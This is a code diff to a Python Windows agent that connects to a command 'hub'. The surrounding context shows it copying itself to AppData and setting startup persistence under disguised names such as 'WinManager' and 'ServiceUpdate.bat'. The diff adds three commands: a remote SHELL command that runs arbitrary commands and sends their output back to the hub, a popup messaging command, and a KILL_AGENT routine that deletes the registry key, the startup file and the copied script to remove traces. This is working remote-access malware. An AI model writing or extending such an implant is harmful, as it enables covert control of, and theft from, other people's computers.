@@ -10,6 +10,7 @@ import time
 import ctypes
 import winreg
 import threading
+import subprocess
 
 def establish_persistence():
     """Copies the script to the local drive and adds it to Windows Startup."""
@@ -187,6 +188,76 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                         return
                     elif command == 'PING':
                         client.sendall(b'PING_OK\n')
+                    elif command.startswith('MESSAGE '):
+                        # Extract the message text after "MESSAGE "
+                        message_text = command[8:].strip('"')
+                        try:
+                            # Display system-level popup using Windows API
+                            ctypes.windll.user32.MessageBoxW(0, message_text, "Message from King", 0x40)  # MB_ICONINFORMATION
+                            print(f'[+] Displayed popup: "{message_text}"')
+                        except Exception as e:
+                            print(f'[-] Failed to display popup: {e}')
+                    elif command.startswith('SHELL '):
+                        # Extract the shell command after "SHELL "
+                        shell_cmd = command[6:].strip('"')
+                        try:
+                            # Run the command and capture output
+                            result = subprocess.check_output(shell_cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
+                            output = result.decode('utf-8', errors='ignore').strip()
+                            # Send the output back to the hub
+                            json_output = json.dumps({'command': shell_cmd, 'output': output})
+                            client.send(f"SHELL_SIZE {len(json_output)}\n".encode())
+                            client.sendall(json_output.encode())
+                            print(f'[+] Executed shell command: {shell_cmd}')
+                        except subprocess.TimeoutExpired:
+                            error_msg = json.dumps({'command': shell_cmd, 'error': 'Command timed out after 30 seconds'})
+                            client.send(f"SHELL_SIZE {len(error_msg)}\n".encode())
+                            client.sendall(error_msg.encode())
+                            print(f'[-] Shell command timed out: {shell_cmd}')
+                        except subprocess.CalledProcessError as e:
+                            error_output = e.output.decode('utf-8', errors='ignore').strip()
+                            error_msg = json.dumps({'command': shell_cmd, 'error': f'Exit code {e.returncode}', 'output': error_output})
+                            client.send(f"SHELL_SIZE {len(error_msg)}\n".encode())
+                            client.sendall(error_msg.encode())
+                            print(f'[-] Shell command failed: {shell_cmd} (exit code {e.returncode})')
+                        except Exception as e:
+                            error_msg = json.dumps({'command': shell_cmd, 'error': str(e)})
+                            client.send(f"SHELL_SIZE {len(error_msg)}\n".encode())
+                            client.sendall(error_msg.encode())
+                            print(f'[-] Shell command error: {e}')
+                    elif command == 'KILL_AGENT':
+                        print('[*] KILL_AGENT command received. Terminating and cleaning up...')
+                        try:
+                            # Remove registry key
+                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
+                            winreg.DeleteValue(key, 'WinManager')
+                            winreg.CloseKey(key)
+                            print('[+] Registry key removed')
+                        except Exception as e:
+                            print(f'[-] Failed to remove registry key: {e}')
+                        
+                        try:
+                            # Remove startup batch file
+                            startup_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+                            bat_path = os.path.join(startup_folder, "ServiceUpdate.bat")
+                            if os.path.exists(bat_path):
+                                os.remove(bat_path)
+                                print('[+] Startup batch file removed')
+                        except Exception as e:
+                            print(f'[-] Failed to remove startup file: {e}')
+                        
+                        try:
+                            # Remove the copied script
+                            app_data = os.getenv('APPDATA')
+                            target_file = os.path.join(app_data, 'SystemUpdates', 'win_manager.py')
+                            if os.path.exists(target_file):
+                                os.remove(target_file)
+                                print('[+] Agent file removed')
+                        except Exception as e:
+                            print(f'[-] Failed to remove agent file: {e}')
+                        
+                        print('[*] Agent terminated and traces removed.')
+                        return
                     elif command == 'EXPLORE_DRIVES':
                         try:
                             report = explore_drives()
